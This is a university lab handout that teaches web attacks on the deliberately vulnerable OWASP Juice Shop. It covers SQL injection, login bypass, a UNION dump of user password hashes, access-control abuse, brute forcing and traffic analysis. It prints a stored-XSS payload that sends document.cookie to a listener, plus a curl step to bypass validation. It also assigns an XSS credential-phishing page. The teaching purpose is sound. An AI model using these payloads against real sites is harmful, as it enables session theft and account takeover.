
Computer Security Lab 2 : Networks and web security
====

## About the lab


* This document contains task descriptions and theory for network lab. If there are any differences between the return template and this file, consider this to be the up-to-date document.
* **You can use your own computer if you want.** Check "Prerequisities" chapter for information on what you need to install. This lab has been made to be completed in Linux environment and tested to work in Ubuntu and Kali. However it should work in any other operating system.
* You are not expected to be able to finish all the tasks during the lab session. Feel free to continue them at your own time.
* Check the deadline from Moodle and __remember that you have to return your name and GitHub repository infromation to Moodle before deadline.__

## Background


It is very likely that nowadays the most of us are browsing the Internet on a daily basis. We are using wide variety of platforms and browsers to access different kind websites or web applications.


In many cases, user is able to give some kind of *input* to these websites or applications, regardless of platform or browser.

What could possibly go wrong, if this user input is not properly validated or sanitizied? What if you are even able to put input to somewhere, where you are not supposed to?

In this lab we will go over some basic network and web related security issues with the help of [OWAPS Juice Shop.](https://github.com/bkimminich/juice-shop)

This site could be just another website, but if we cite the developers of it: "Juice Shop is supposed to be the opposite of a best practice or template application for web developers.", we might suppose that it is not.

OWASP is collecting list of top 10 security risks on [each](https://www.owasp.org/index.php/Top_10-2017_Top_10) year. Juice Shop contains them all, and therefore it is great example for examination.

The intention is to learn *why* the following things on tasks are happening and how we might be able to prevent them.


On later task we will also practise capturing and analyzing traffic with [WireShark](https://www.wireshark.org/), and further by using [nmap](https://nmap.org/) for mapping the network. Our target will be [Example Voting App](https://github.com/dockersamples/example-voting-app)


## Theory

Juiceshop is vulnerable to multiple types of [injections](https://www.owasp.org/index.php/Top_10-2017_A1-Injection). We are mostly focusing on [SQL injections](https://www.owasp.org/index.php/SQL_Injection). In SQL injection the user injects SQL code to the SQL query happening in the server side. This is usually possible because, the SQL query that is happening in the server side takes the client's input *straight* as a parameter. Attacker can modify the query and this way expose, modify or even destroy data in the database. SQL is just one example about injection - any similar way in any imaginable way, which takes some strings or characters as input to create some kind of command, can be vulnerable.

In many places the Juice Shop is [improperly validating its inputs](https://cwe.mitre.org/data/definitions/20.html) Basically this means that the attacker is capable of crafting the input in a form that the rest of the application is not expecting. You will see this in action when you cash out with negative amount of items or when you leave a 0 star review of the store.

 Usually shops like Juice Shop, are made to be used by multiple users. In these cases different users have different privileges and are therefore able to access different places. For example you are able to access your basket but not other users baskets. In the same fashion only admin should be able to access the administration panel. However Juice Shops [access control is broken](https://en.wikipedia.org/wiki/Privilege_escalation) and users can access places that they should not be able.  

The final thing we focus on by using the Juice Shop, is Cross-Site Scripting. Short explanation on what Cross-Site Scripting mean taken from [OWASP: ](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) "Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page ". During this lab you will see XSS in action and will create your own attack. 


More readings, if you are lacking some knowledge:

https://cwe.mitre.org/data/definitions/20.html

https://www.owasp.org/index.php/Data_Validation

https://www.owasp.org/index.php/Top_10-2017_A1-Injection 

https://www.owasp.org/index.php/Injection_Flaws

https://www.owasp.org/index.php/SQL_Injection

http://cwe.mitre.org/top25/

https://en.wikipedia.org/wiki/Privilege_escalation

https://www.owasp.org/index.php/DOM_Based_XSS

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)



## Prerequisities


If you are using the virtual machine provided to you by the course staff,
then everything should be already installed to your machine. 

Below are the steps to set it up on your own system, in case you want to use your own computer, or your are otherwise unable to aquire provided virtual machine.

<details>

### Task 1

Get [Docker](https://www.docker.com/) instance for Juice Shop
```shell
docker pull bkimminich/juice-shop
```

All the tasks are doable using your browsers developer tools. Tasks were tested and created by using Firefox, but other browsers should works just as well.

### Task 2

Same as above and the following:


* For the brute forcing task, the tools vary depending on how you choose to do it. Read the instructions and proceed to get the tools you want. There are some hints in the task description.

### Task 3

It is helpful to use programs like [curl](https://curl.haxx.se/) to send your XSS attack to the Juice Shop. Any other software that can send POST requests is also fine.

You are expected to set up a basic server so having something like python and [flask](http://flask.pocoo.org/)/[BaseHttpServer](https://docs.python.org/2/library/basehttpserver.html) is can be useful. You are free the setup the server any way you wish.

### Task 4

the example-voting app is located at
```shell
git clone https://github.com/dockersamples/example-voting-app
```

Install Wireshark and nmap. Method depends on your operating system.

For the security experiment you can use Burp, Zapp or any other tool you wish.

---

</details>

Grading
---
<details>
You are elgible to following grades in this exercise by doing tasks as defined. Great ideas and implementations could compensate some poorly implemented ones.
Upper grade requires that all previous ones have been done as well.

It is estimated, that you are able to do Tasks 1 & possibly 2 during lab session (4 hours).

Task| Grade/Level | Description
:--:|:--:|--
1|2|Basic SQL injections and Client Side Resource Manipulation
2|3|More complicated SQL injections, basics of Cross-Site Scripting and more Client Side Resource Manipulation
3|4| Cross-Site Scripting attack
4|5| Network traffic analysis and a security experiment

Grade 1 can be aquired by doing lecture questionnaires from the corresponding lecture.
</details>
## Particularly in tasks 1 and 2:

***To be able to complete these tasks,*** you will need to explain *why things are happening*. Each answer, which is giving only pure commands or code is automatically though as incompleted or insufficient.

We happen to know, that there might be some answers availabe as wild out there.


---

## Task 1

In level 2 and 3 tasks, you will only need your browser, its developer tools and Juice Shop. Start the Juice Shop using docker. Most importantly follow the traffic in the network tab. 

If you are rusty on your SQl injections check the following before you start : https://www.acunetix.com/websitesecurity/sql-injection/

Start Juice Shop with the command
```shell
docker run --rm -p 3000:3000 bkimminich/juice-shop
```
Site is hosted at ```localhost:3000```. Access it with your browser. Observe and modify the traffic with your browsers developer tools while browsing the site and do the following tasks.

__Note__ In Firefox's devtools, in the "Headers" section of packet information, there is a handy "Edit and Resend" button Which can be used to modify packets.


### Basic SQL Injections

**Noticing errors**

Search field of the JuiceShop is vulnerable to SQL injection. Server is also set up in such a way that it will return an SQL error message if you cause one. Error is viewable from browsers developertools. Inject some SQL to the searchfield and cause an __SQL__ error. 

__Hint__ Try different SQL symbols like statement terminators, comments, quotation marks. Check the network tab for servers response 

__What command did you use?__

__Why did it cause an error?__
 
__Paste here the command that the SQL server attempts to execute and replace the part(s) taken from the searchfield with the text "SEARCHRESULT".__ 

**Deleted item?**

Shop has an item that has been deleted and therefore does not show on searches. For some reason the shop doesn't just remove the item but instead uses a specific variable to set the item as deleted. Do a SQL-attack that causes all the items to be visible (including deleted one.)

__Hint__ Examine the SQL-query that the server returned in the last part. How does this query exclude deleted items? Remove that part of the query using comments. 

__What variable is used for "deleting" items?__

__How did you make all items visible?__
 

__Explain shortly the logic behind your attack. Why does it work?__



---
**A bit more concrete error**

As we previously noticed, we are indeed able to inject some SQL commands to the server. How about log-in fields?
If this area is vulnerable, it could be very dangerous, because it might enable unauthroized access.

 [Bypass the login](https://www.acunetix.com/websitesecurity/sql-injection/) and log in as the first user in the database.

__What command(s) did you use?__

__Why it is working/what is happening?__

__What user did you log in as?__

---



---
**Another's basket**

But anyway, could we control other users a bit?

This site's access control is lacking and users can in some cases access into places where they should not be able to. One example is the user's basket. Find a way to access another users basket *and add some products into it*.

You don't need to know anything about another users, we are using just some random victim. There are atleast two ways to solve this. You have to be able to **some way gain other users baskets content** and **some way add product to other users basket.**

**Here are hints on two different ways to solve this.** 
1.  Log in as admin or as a user you created and check the traffic that happens when you add products to your basket. Can I modify the packets so that the system returns some other users information? Can I use same logic to add products to other users basket? It is enough if you can see the other users basket content in the return packets. You don't have to see it visually in the webpage.
2. How does the system know who is logged in? Do you possess some kind of a token that indetifies you as you? Can you change it? With this solution it is possible to acces someone elses basket through "My Basket" button and visually see the contents and edit them.


__How did you do it? Why you were able to?__

---
**Scoreboard**

At this point we might have seen some notifications about challenges we have completed. There is actually board about challenges you have completed and... it is behind of challenge.

Sometimes the HTML contains unwanted stuff. This site has for example a scoreboard, and the top bar should contain a link to it. Use your browsers developer tools and make it visible.
__Hint__ You can edit the fields in "Inspector" tab

__How did you make it visible?__





## Task 2 

**'These are not my credentials'**

Use SQL injection to the searchfield using [UNION](http://www.sqlinjection.net/union/) command to get all the users emails and passwordhashes and make them visible on the shop page.

 __Hint__ In this exercise you need to know the name of the users table, its column number and the name of the email and password fields. These values can be **guessed**. Table and column names are obvious. Try guessing them and check the error messages if you got it right.
 
 First form a statement that attempts to select all the columns from the users table. If the server returns "table does not exist" you guessed it wrong. If you receive the following error "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns" you are on the right track. 
 
 After you know the table name, you have to find out how many columns the Products table has, so you can select that many columns from the users table. 
 
 You can guess this if you want to, but the column amount can also be found from the response you get from a product search. 
 Now select that many columns from the users table where atleast two of them are email and password. If the values are not visible, you might have put it to a field that is not rendered visible. Try putting it to a different field.
 

__What SQL command did you use?__

__Explain shortly the logic behind your attack. Why and how does it work?__

---

**Annoying pop-up**

For next, we attempt some cross-site scripting attacks. Insert the following code snippet to "Order ID" field in "Track Orders" tab and to the search field. This should trigger the xss.

```<script>alert("XSS")</script>```

Attack on the "Order ID" is an [reflected XSS attack](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Reflected_XSS_Attacks) and the attack on the searchfield is [DOM based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).

__What is the difference between these two types of attacks? How can you protect your applications against both types of attacks?__

XSS attacks above are relatively harmless. They only affect you and nobody else. It would be way more harmful if you could get some more damaging code snippet inside the servers database or otherwise visible to all the users. Basically you would have to create a user or a product which name is the XSS-script. Both of those are possible, however creating a user is easier. 

For this example we are going to use the following code snippet. ```<script>document.write('<img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   >');</script>```. This will make the server to attempt to fetch a image from a server we control and when it fails send back the users cookies. This obviously means we need a server. For this we can utilize netcat. Use command ```nc -l 5555 -v```. This starts a TCP server which listens to port 5555.

If you attempt to just create a user with the name ```<script>document.write('<img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   >');</script>``` using the sites own create account page it will fail. This is because Juice Shop validates the input in the client side **but** not in the server side. For this reason we are going to use curl to send the user creation packet directly to the api, this way bypassing the sites input validation. In order to do this we need to know what type of packet the api expects.

We can find out the type of packet we need in the following way. Create a user with what ever username and password you like. Then check the post packet that is sent when you press the create user button. From this packet you see the location and the packet content that is needed to create an account. Create a json file that is in the same format as in the POST request, change the email field to above mentioned code snippet and send it to the user creation api using curl. Below is and example of the curl request.  

```shell
curl -d @<your_json_file_name>.json -H "Content-Type: application/json" -X POST <API_url>
```
After this go to the administration panel while you have netcat on. Administration panel should not appear normally and the netcat should show your cookie information.

__*Paste a screenshot of the administration panel and netcat when the exploit is active.*__  

---

### Brute forcing

Now lets do something different and try some basic brute forcing. 
Do the following:
* Start [muumitalo](https://github.com/VilleKemp/Muumitalo).  ```git clone https://github.com/VilleKemp/Muumitalo``` follow the instruction on the git page on how to start it. You will be bruteforcing this server
* Create a wordlist containing mutations of the word "vaapukkamehu". Create mutations where individual letters case changes between upper and lower case. Also make mutations where letter 'a' can be number '4' and letter 'e' can be number '3'. 
* Brute force the right answer to the question posed by the server using above mentioned wordlist
You can use any tools you find online. If you want to, you can code your own mutator. Alternatively you can search online for a existing mutator/mutators and use them to create the wordlist. Same thing with the actual attack. You can use programs like [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) to do the actual attack after you have created the wordlist.

#### Returns

* Wordlist
* Any code you created.
* Detailed description on how you created the wordlist and how you did the brute force attack.

__Hint__ Internet is full of tools to create wordlists. It is potentially easier to combine multiple tools to create the wordlist. If you plan to create your own check python itertools. You can use existing tools to do the attack if you don't feel like creating your own script. [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) for example can do the attack easily if you have a list containing all the mutations. Don't try to do the attack using burp community edition. It does not allow you to use files as payloads.

## Task 3

Let's get back to Juice Shop. 

The XSS attack you did in the previous task was mostly just annoying. It could however have been way more malicious. For next, we are actually doing that and modify it to be way more dangerous. Lets create a XSS-attack that replaces the Juice Shop administration panel with Juice shops login page. Then when the users inputs their credentials the site sends this information to your own server. So your task is the following:

* **Setup a server.** No need to do anything fancy. Basic python [flask](http://flask.pocoo.org/)/[BaseHttpServer](https://docs.python.org/2/library/basehttpserver.html) that can receive post requests is fine. Server can print or save the information to a file. Anything goes as long as it shows that the data entered the server.  
* **When the user accesses the Juice Shop's administration panel, the page will look like the Juice Shops login page.** Page should be as similiar as possbile but small differences are fine. For example slightly different size login fields, email field not checking for @ sign etc.
* **When the user inputs anything to the email and password fields and presses the *Login*-button all the information in the email and password fields are sent to your server.** The way you send/show the information is up to you. You just have to demostrate in the server side that the data has entered and that it is the same as inputted to the email and password fields.

We are actually creating something very phishy, just by using XSS vulneralibity.

## Rewrite
Lets return to the Juice Shop for a moment. Earlier we did some basic XSS-attacks to demonstrate how they work. Now lets build on that. Lets create a situation where when someone accesses the Juice Shops administration panel they are shown the loging screen. When the user inputs their 

#######


### Returns

* Your own server code
* Request you send to the Juice Shop in a separate file
* **Clear** instructions on how to start your own server, send the Cross-Site script attack and how to verify that the information was sent to your server from Juice Shop. 
* Show your possible code files(particularly HTML/JavaScript) as unpacked or non-formatted as well.

__Tips__  
Refresh your mind how JavaScript can modify HTML elements.

It is also handy to use programs like [curl](https://curl.haxx.se/) to send your XSS-scripts.

Keep in mind that the user database is purged each time you restart the Juice Shop. If you break the system just reboot the docker container.

You will likely need to format your request so that the servers JSON parser will accept it. Feel free to use tools like https://www.freeformatter.com/json-escape.html


## Task 4

You can complete this task in two ways. You can do the predefined task explained below or you can suggest a task that interests you and do that. __Contact the course assistants__ and describe them what you are interested on doing/trying to do. If they say it is good you can do that as your task 4.

## Predefined task

### Setup

Start the example-voting-app
```
cd example-voting-app
docker-compose up
```
### Task
In this task you are expected to learn to capture traffic by using WireShark, and to do very basic network analysis. With the knowledge you gain, you are then expected to draw a data flow diagram on how the system behaves when you cast a vote or check the results. After this you try some form of a security experiment(for example modify traffic using Burp Suite). Report your result even if you are unsuccesful. 


__Hint__
 You can draw the diagram by hand and take a picture (asuming that the picture is clear enough) or use any tool you like to draw it. 
Scan networks (docker network ls, docker network inspect examplevotingapp_*, nmap 172.xx.0.0/24)
Look at  https://github.com/dockersamples/example-voting-app for architecture diagram (good basis for DFD)
Use wireshark on the two docker networks to see what happens when a vote is attempted
 

 
To run Wireshark correctly without using straight root priviledges, we should add current user to group *wireshark* with following command:
```shell
sudo usermod -a -G wireshark compsec
```
Log out and log in, wireshark should show now all interfaces. This is already done with provided Kali Linux.


 ### How to complete this task

Return the following:

* Data flow diagram or some other type of picture/written document that explains the dataflow in the situation where you cast a vote and when you check the results

* Short explanation on the steps you took to analyze the network and create the diagram

* Short explanation on what kind of security experiment you tried, how you did it and what was the result






























